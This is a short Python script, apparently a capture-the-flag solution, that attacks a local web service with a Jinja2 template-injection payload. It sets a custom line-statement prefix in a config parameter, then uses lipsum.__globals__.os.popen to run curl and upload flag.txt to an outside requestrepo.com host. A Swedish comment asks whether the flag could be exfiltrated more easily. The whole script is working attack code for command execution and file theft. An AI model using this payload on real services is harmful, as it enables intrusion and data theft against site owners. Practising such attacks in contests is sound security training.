import requests

config = '{"line_statement_prefix": "?"}'

# osäker om man kan exfilla flaggan på lättare sätt...
template = """
?if lipsum.__globals__.os.popen('curl -F f=@flag.txt https://gvk9aok7.requestrepo.com/')
?endif
"""

res = requests.get(
    "http://localhost:50000/view",
    params={"config": config, "template": template},
    timeout=10,
)
